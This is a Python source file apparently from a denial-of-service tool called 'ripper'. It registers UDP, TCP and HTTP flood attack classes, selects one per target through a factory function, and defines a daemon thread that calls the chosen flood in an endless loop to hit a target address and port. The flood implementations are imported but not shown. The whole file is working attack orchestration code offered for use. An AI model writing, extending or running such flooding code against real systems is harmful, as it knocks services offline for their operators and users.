from threading import Thread

from ripper.actions.attack_method import AttackMethod
from ripper.actions.http_flood import HttpFlood
from ripper.actions.tcp_flood import TcpFlood
from ripper.actions.udp_flood import UdpFlood

# Forward Reference
Context = 'Context'
Target = 'Target'


attack_methods: list[AttackMethod] = [
    UdpFlood,
    TcpFlood,
    HttpFlood,
]

attack_method_labels: list[str] = list(map(lambda am: am.label, attack_methods))


def attack_method_factory(context: Context):
    target = context.target
    attack_method_name = target.attack_method
    if attack_method_name == 'udp-flood':
        return UdpFlood(target, context)
    elif attack_method_name == 'http-flood':
        return HttpFlood(target, context)
    elif attack_method_name == 'tcp-flood':
        return TcpFlood(target, context)
    # Dangerours, may lead to exception
    return None


class Attack(Thread):
    """This class creates threads with specified attack method."""
    _method: str
    """Attack method."""
    _ctx: Context
    """Context to collect Statistic."""

    def __init__(self, context: Context = None):
        """
        :param target: Target IPv4 address and destination port.
        :param method: Attack method.
        """
        Thread.__init__(self, daemon=True)
        self._ctx = context

    def run(self):
        runner = attack_method_factory(self._ctx)
        while True:
            runner()

